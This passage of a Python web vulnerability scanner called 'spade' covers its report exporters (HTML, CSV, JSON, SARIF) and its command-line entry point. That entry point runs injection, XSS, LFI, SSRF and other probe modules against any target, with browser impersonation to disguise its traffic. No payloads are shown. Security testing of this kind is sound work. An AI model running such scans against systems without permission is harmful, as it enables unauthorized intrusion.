<p class="subtitle">{htmlmod.escape(target)} &mdash; {end.strftime('%Y-%m-%d %H:%M:%S')}</p>
<div class="summary"><div class="card"><h3>Duration</h3><div class="val">{dur:.1f}s</div></div><div class="card"><h3>Findings</h3><div class="val">{len(sf)}</div></div><div class="card"><h3>Severity</h3><div style="margin-top:8px">{summary}</div></div>{evidence_card}</div>
<table><thead><tr><th style="width:90px">Severity</th><th style="width:200px">Category</th><th>Detail</th><th style="width:300px">URL</th></tr></thead><tbody>{rows}</tbody></table>
<div class="footer">spade &mdash; {end.strftime('%Y-%m-%d %H:%M:%S')}</div>
</div></body></html>"""
    with open(out,"w",encoding="utf-8") as f: f.write(html)
    return out

def gen_csv(finds, target, out):
    """CSV temuan. Lima kolom lama tetap di posisi semula; kolom bukti/metadata menyusul di belakang."""
    finds = _normalize_findings(finds)
    with open(out,"w",newline="",encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(["Severity","Category","Detail","URL","Target","Confidence","CVSS_Score","CVSS_Vector",
                    "CWE","OWASP","Repro_Curl","Evidence_Status","Evidence_URL"])
        for fi in finds:
            meta = _finding_meta(fi)
            repro = repro_curl(getattr(fi, "evidence", None))
            w.writerow([fi[0], fi[1], fi[2], fi[3] or "", target,
                        _finding_confidence(fi),
                        "" if meta is None or meta.vector is None else meta.score,
                        (meta.vector if meta else "") or "",
                        (meta.cwe if meta else "") or "",
                        (meta.owasp if meta else "") or "",
                        repro["curl"],
                        evidence_status(fi),
                        evidence_url(fi)])

SarifLevels = {"CRITICAL": "error", "HIGH": "error", "MEDIUM": "warning", "LOW": "note", "INFO": "note"}

def _cvss_score(meta):
    """Skor CVSS, atau None kalau temuan tidak punya vector (informasional)."""
    payload = cvss_of(meta)
    return payload["score"] if payload else None

def _cvss_help_uri(meta):
    if meta and meta.cwe:
        number = meta.cwe.split("-")[-1]
        return f"https://cwe.mitre.org/data/definitions/{number}.html"
    return "https://owasp.org/Top10/"

def gen_json(finds, target, out, scan=None):
    """Laporan JSON mesin-baca: metadata scan + ringkasan + temuan lengkap dengan bukti."""
    scan = scan or {}
    finds = _normalize_findings(finds)
    impersonate = scan.get("impersonate")
    payload = {
        "tool": {"name": "spade", "version": SPADE_VERSION},
        "target": target,
        "scan": {
            "mode": scan.get("mode"),
            "started_at": scan.get("started_at"),
            "finished_at": scan.get("finished_at"),
            "duration_s": scan.get("duration_s"),
            "impersonate": impersonate,
            "workers": scan.get("workers"),
            "modules": scan.get("modules", []),
            "errors": scan.get("errors", []),
            "redacted": REDACT_ENABLED,
        },
        "summary": scan_summary(finds),
        "findings": [f.to_dict(EVIDENCE_SNIPPET_CHARS_JSON, None, impersonate) for f in finds],
    }
    with open(out, "w", encoding="utf-8") as handle:
        json.dump(payload, handle, indent=2, ensure_ascii=False)
        handle.write("\n")
    return out

def gen_sarif(finds, target, out, scan=None):
    """Laporan SARIF 2.1.0 supaya temuan bisa diunggah ke GitHub code scanning/dashboard SARIF."""
    scan = scan or {}
    finds = _normalize_findings(finds)
    rules = []
    rule_index = {}
    for finding in finds:
        if finding.code in rule_index:
            continue
        meta = _finding_meta(finding)
        rule_index[finding.code] = len(rules)
        rules.append({
            "id": finding.code,
            "name": finding.code,
            "shortDescription": {"text": finding.code},
            "fullDescription": {"text": finding.desc},
            "defaultConfiguration": {"level": SarifLevels.get(finding[0], "note")},
            "helpUri": _cvss_help_uri(meta),
            "properties": {
                "severity": finding[0],
                "confidence": _finding_confidence(finding),
                "cvssScore": _cvss_score(meta),
                "cvssVector": meta.vector if meta else None,
                "cwe": meta.cwe if meta else None,
                "owasp": meta.owasp if meta else None,
                "tags": ["security", "web"],
            },
        })
    results = []
    for finding in finds:
        meta = _finding_meta(finding)
        results.append({
            "ruleId": finding.code,
            "ruleIndex": rule_index[finding.code],
            "level": SarifLevels.get(finding[0], "note"),
            "message": {"text": f"{finding.code}: {finding[2]}" + (f" ({finding[3]})" if finding[3] else "")},
            "locations": [{
                "physicalLocation": {
                    "artifactLocation": {"uri": redact_url(finding[3] or target)},
                    "region": {"startLine": 1},
                },
            }],
            "partialFingerprints": {"findingId": finding.finding_id},
            "properties": {
                "confidence": _finding_confidence(finding),
                "cvssScore": _cvss_score(meta),
                "cwe": meta.cwe if meta else None,
                "owasp": meta.owasp if meta else None,
                "evidenceUrl": evidence_url(finding),
            },
        })
    document = {
        "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
        "version": "2.1.0",
        "runs": [{
            "tool": {"driver": {"name": "spade", "version": SPADE_VERSION, "informationUri": "https://github.com/RiloArbabillah/spade",
                                "rules": rules}},
            "invocations": [{
                "executionSuccessful": True,
                "startTimeUtc": scan.get("started_at"),
                "endTimeUtc": scan.get("finished_at"),
                "properties": {"target": target, "mode": scan.get("mode")},
            }],
            "results": results,
        }],
    }
    with open(out, "w", encoding="utf-8") as handle:
        json.dump(document, handle, indent=2, ensure_ascii=False)
        handle.write("\n")
    return out

# ══════════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════════

# Registry modul scan — satu sumber kebenaran untuk mode CLI maupun test.
# Format: key -> (label tampilan, fungsi scan(sess, base_url, ctx))
ALL_MODULES = OrderedDict([
    ("tech",      ("Teknologi", tech_finger)),
    ("headers",   ("Security Headers", sec_headers)),
    ("robots",    ("robots.txt", robots_txt)),
    ("sensitive", ("File Sensitif", sensitive_files)),
    ("dirlist",   ("Directory Listing", dir_listing)),
    ("methods",   ("HTTP Methods", http_methods)),
    ("cors",      ("CORS", cors_check)),
    ("tls",       ("TLS/SSL", tls_ssl)),
    ("forms",     ("Analisis Form", scan_forms_analyze)),
    ("sqli",      ("SQL Injection", scan_sqli)),
    ("xss",       ("XSS", scan_xss)),
    ("openr",     ("Open Redirect", open_redirect)),
    ("lfi",       ("LFI", lfi_check)),
    ("cmdi",      ("Command Injection", cmd_injection)),
    ("ssrf",      ("SSRF", ssrf_check)),
    ("ratelimit", ("Rate Limit", rate_limit)),
    ("xxe",       ("XXE", scan_xxe)),
    ("ssti",      ("SSTI", scan_ssti)),
    ("nosqli",    ("NoSQL Injection", scan_nosqli)),
    ("graphql",   ("GraphQL", scan_graphql)),
    ("js",        ("JS Analysis", scan_js)),
    ("jwt",       ("JWT", scan_jwt)),
    ("subdomains",("Subdomain", scan_subdomains)),
])

QUICK_MODULES = ["tech","headers","robots","sensitive","cors","tls","ratelimit"]
DETAILED_ONLY = {"xxe","ssti","nosqli","graphql","js","jwt","subdomains"}
STANDARD_MODULES = [k for k in ALL_MODULES if k not in DETAILED_ONLY]


def main(argv=None):
    """Entry point CLI. argv=None berarti pakai sys.argv (dipakai test dengan list eksplisit)."""
    global DISABLE_COLOR, REDACT_ENABLED
    parser = argparse.ArgumentParser(
        description="spade — Automated Web Vulnerability Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""Contoh:
  python3 spade.py example.com                      # standard (default)
  python3 spade.py example.com --quick               # quick check
  python3 spade.py example.com --detailed            # full scan
  python3 spade.py example.com -o laporan.html       # custom output
  python3 spade.py example.com --csv hasil.csv       # export CSV
  python3 spade.py example.com --json hasil.json     # export JSON
  python3 spade.py example.com --sarif hasil.sarif   # export SARIF""")
    parser.add_argument("target", nargs="?", default="", help="Target URL (opsional — akan diminta interaktif jika kosong)")
    parser.add_argument("-o","--output", default="", help="Laporan HTML")
    parser.add_argument("--csv", default="", help="Export CSV")
    parser.add_argument("--json", default="", metavar="FILE",
                        help="Export JSON (metadata scan + temuan + bukti, cocok untuk pipeline)")
    parser.add_argument("--sarif", default="", metavar="FILE",
                        help="Export SARIF 2.1.0 (untuk GitHub code scanning/CI)")
    parser.add_argument("--no-redact", action="store_true",
                        help="Matikan redaksi cookie/token/password di laporan. HATI-HATI: jangan dibagikan.")
    parser.add_argument("--quick", action="store_true", help="Mode cepat (7 modul, basic checks)")
    parser.add_argument("--detailed", action="store_true", help="Mode lengkap (23 modul, crawl)")
    parser.add_argument("--no-color", action="store_true", help="Output tanpa warna")
    parser.add_argument("--skip-ssl", action="store_true", help="Nonaktifkan verifikasi SSL (untuk sertifikat self-signed/expired)")
    parser.add_argument("--impersonate", default=DEFAULT_IMPERSONATE, metavar="PROFIL",
                        help=f"Profil browser curl_cffi untuk menyamarkan request (default: {DEFAULT_IMPERSONATE}). Contoh: chrome136, safari184, firefox147")
    parser.add_argument("--no-impersonate", action="store_true", help="Matikan browser impersonation (fingerprint default curl; untuk debugging/paritas)")
    parser.add_argument("--workers", type=int, default=DEFAULT_WORKERS, help=f"Jumlah request paralel per scan (default: {DEFAULT_WORKERS}, 1 = sekuensial)")
    parser.add_argument("--crawl-depth", type=int, default=2, help="Kedalaman crawl mode detailed (default: 2)")
    parser.add_argument("--crawl-max", type=int, default=30, help="Maksimal halaman di-crawl mode detailed (default: 30)")
    args = parser.parse_args(argv)
    if args.no_color: DISABLE_COLOR = True
    if args.no_redact:
        REDACT_ENABLED = False
        print()
        warn("REDACT OFF — cookie/token/password ikut tersimpan di laporan. Jangan bagikan hasil scan ini.")

    # Validasi profil impersonasi sebelum request apa pun dikirim.
    profiles = supported_impersonate_profiles()
    if args.no_impersonate:
        args.impersonate = None
    elif args.impersonate not in profiles:
        parser.error(f"profil impersonate '{args.impersonate}' tidak dikenal. "
                     f"Contoh yang valid: chrome146, safari184, firefox147, edge101 (total {len(profiles)} profil)")

    # ── Interactive prompt jika target tidak diberikan ──
    if not args.target:
        print()
        print(f"    {c('bold',c('cyan','+===========[ SPADE ]===========+'))}")
        print(f"    {c('bold',c('cyan','|'))}  {c('bold','Web Vuln Scanner')}     {c('bold',c('cyan','|'))}")
        print(f"    {c('bold',c('cyan','+==============================+'))}")
        try:
            inp = input("\n  [>] Masukkan domain/URL target: ").strip()
            while not inp:
                inp = input("  [>] Target tidak boleh kosong: ").strip()
        except EOFError:
            print("\n  [!] Tidak ada input target (EOF). Keluar.", file=sys.stderr)
            return 2
        args.target = inp
        print()
        print("  Pilih mode scan:")
        print("    [1] Quick     — 7 modul, basic checks (cepat)")
        print("    [2] Standard  — 16 modul, recommended (default)")
        print("    [3] Detailed  — 23 modul, full scan dengan crawl + subdomain")
        mode_ch = input("  [>] Pilih [1/2/3] (default: 2): ").strip()
        while mode_ch and mode_ch not in ("1","2","3"):
            mode_ch = input("  [>] Pilih 1, 2, atau 3: ").strip()
        if mode_ch == "1":
            args.quick = True
        elif mode_ch == "3":
            args.detailed = True
        # else default (standard)
        print()


    target = normalize_url(args.target)
    host = host_from_url(target)
    mode = "quick" if args.quick else ("detailed" if args.detailed else "standard")

    print()
    print(f"    {c('bold',c('cyan','+===========[ SPADE ]===========+'))}")
    print(f"    {c('bold',c('cyan','|'))}  {c('bold','Web Vuln Scanner')}     {c('bold',c('cyan','|'))}")
    print(f"    {c('bold',c('cyan','|'))}  mode: {c('bold',mode.upper())}{' '*(13-len(mode))}  {c('bold',c('cyan','|'))}")
    print(f"    {c('bold',c('cyan','+==============================+'))}")
    print()
    info(f"Target: {c('bold',target)}")
    info(f"Mode  : {mode.upper()}")
    info(f"Bot   : {args.impersonate or 'tanpa impersonation'}")
    info(f"Start : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print()

    verify_ssl = not args.skip_ssl
    set_request_executor(args.workers)
    sess = ThreadLocalSession(timeout=15, verify_ssl=verify_ssl, impersonate=args.impersonate)
    # Bukti (request/response) hanya boleh berasal dari scan yang sedang berjalan.
    reset_evidence()
    set_evidence_base_url(target)
    finds = FindingList(target)
    start = datetime.now()
    scan = {
        "mode": mode,
        "started_at": start.isoformat(timespec="seconds"),
        "finished_at": None,
        "duration_s": None,
        "impersonate": args.impersonate,
        "workers": args.workers,
        "modules": [],
        "errors": [],
        "redacted": bool(REDACT_ENABLED),
    }
    ctx = {"crawler": None}

    wafs = waf_detect(sess, target, ctx)
    if wafs: info(f"WAF terdeteksi: {', '.join(wafs)}")
    # Ambil halaman utama sekali, agar modul pasif (headers/tech/js/jwt/crawl) tidak request berulang.
    base_resp = get_base_response(sess, target, ctx)

    if mode == "quick":
        modules = list(QUICK_MODULES)
        crawler = None
    elif mode == "detailed":
        modules = list(ALL_MODULES.keys())
        info("Merayapi halaman (depth 2)...")
        crawler = Crawler(sess, target, depth=args.crawl_depth, max_p=args.crawl_max)
        crawler.crawl(seed_text=base_resp.text if base_resp is not None else None)
        info(f"Merayapi {len(crawler.pages)} halaman")
        print()
    else:
        modules = list(STANDARD_MODULES)
        crawler = None
    ctx["crawler"] = crawler

    info(f"Menjalankan {len(modules)} modul...")
    for key in modules:
        name, func = ALL_MODULES[key]
        print(f"\n  {c('bold',c('magenta','---'))} {c('bold',name)}")
        scan["modules"].append(key)
        try:
            res = func(sess, target, ctx)
            if res: finds.extend(res)
        except Exception as exc:
            # Satu modul gagal tidak boleh membatalkan scan, tapi juga tidak boleh
            # hilang diam-diam: catat sebagai temuan INFO + masuk ke scan["errors"].
            detail = f"Modul '{key}' ({name}) gagal dijalankan: {type(exc).__name__}: {exc}"
            scan["errors"].append({"module": key, "error": f"{type(exc).__name__}: {exc}"})
            err(detail)
            # Bukti HTTP tidak relevan untuk kegagalan modul, jadi tempel bukti
            # dimatikan supaya laporan tidak menyesatkan.
            finds.append(("INFO", "SCAN_ERROR", detail, target), evidence_url=None)

    end = datetime.now()
    dur = (end-start).total_seconds()
    scan["finished_at"] = end.isoformat(timespec="seconds")
    scan["duration_s"] = round(dur, 2)
    print(f"\n  {c('bold',c('magenta','+==============================+'))}")
    print()
    info(f"Selesai dalam {dur:.1f}s")
    info(f"Total temuan: {len(finds)}")
    for sev in ["CRITICAL","HIGH","MEDIUM","LOW","INFO"]:
        n = sum(1 for f in finds if f[0]==sev)
        if n>0: ic = {"CRITICAL":"bg_red","HIGH":"red","MEDIUM":"yellow","LOW":"blue","INFO":"dim"}; print(f"    {c(ic.get(sev,''),f'{sev}: {n}')}")
    print()

    outpath = args.output or f"spade_{host}.html"
    gen_html(finds, target, start, end, outpath, impersonate=args.impersonate)
    good(f"Laporan: {outpath}")
    if args.csv:
        gen_csv(finds, target, args.csv)
        good(f"CSV   : {args.csv}")
    if args.json:
        gen_json(finds, target, args.json, scan=scan)
        good(f"JSON  : {args.json}")
    if args.sarif:
        gen_sarif(finds, target, args.sarif, scan=scan)
        good(f"SARIF : {args.sarif}")
    if scan["errors"]:
        warn(f"{len(scan['errors'])} modul gagal — lihat temuan SCAN_ERROR di laporan.")
    print()
    return 0

if __name__ == "__main__":
    sys.exit(main())
